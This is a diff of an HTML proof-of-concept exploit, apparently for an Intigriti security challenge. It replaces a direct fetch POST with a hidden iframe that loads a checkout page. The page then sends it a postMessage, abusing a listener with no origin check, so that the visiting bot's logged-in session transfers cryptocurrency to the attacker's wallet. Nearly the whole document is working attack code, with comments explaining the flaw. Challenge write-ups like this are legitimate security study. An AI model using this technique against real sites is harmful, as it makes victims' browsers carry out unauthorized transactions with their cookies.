@@ -1,33 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Auto POST</title>
+    <meta charset="UTF-8">
+    <title>Security Research - Cryptigriti</title>
 </head>
 <body>
+    <!-- 
+        1. We load the checkout page in a hidden iframe.
+        2. We include the parameters so the page initializes correctly.
+    -->
+    <iframe 
+        id="exploitFrame" 
+        src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000" 
+        style="display:none;">
+    </iframe>
 
-<script>
-  fetch("https://challenge-0126.intigriti.io/api/transaction", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      toAddress: "18b98004faf4a2f521c8d459a734d23d02",
-      currency: "1337COIN",
-      amount: 1
-    })
-  })
-  .then(res => res.text())
-  .then(data => {
-    console.log("Response:", data);
-  })
-  .catch(err => {
-    console.error("Error:", err);
-  });
-</script>
+    <script>
+        const targetOrigin = "https://challenge-0126.intigriti.io";
+        const iframe = document.getElementById('exploitFrame');
 
-<p>Sending POST request...</p>
+        // When the iframe finishes loading, the bot's session is active inside it
+        iframe.onload = function() {
+            console.log("Iframe loaded, triggering cross-origin transaction...");
 
+            /* 
+               The 'checkout.html' page has a listener that does not verify origin:
+               window.addEventListener('message', async function(event) { ... })
+               
+               By sending this postMessage, we tell the checkout page to execute 
+               a POST /api/transaction using the BOT'S cookies.
+            */
+            const payload = {
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: "1eb5de369cc0da5eda6b6c79baab31782e", // Your wallet address
+                    currency: "1337COIN",
+                    amount: 1
+                }
+            };
+
+            // Send the message to the iframe
+            iframe.contentWindow.postMessage(payload, "*");
+            
+            console.log("Payload sent to bot session.");
+        };
+    </script>
 </body>
 </html>
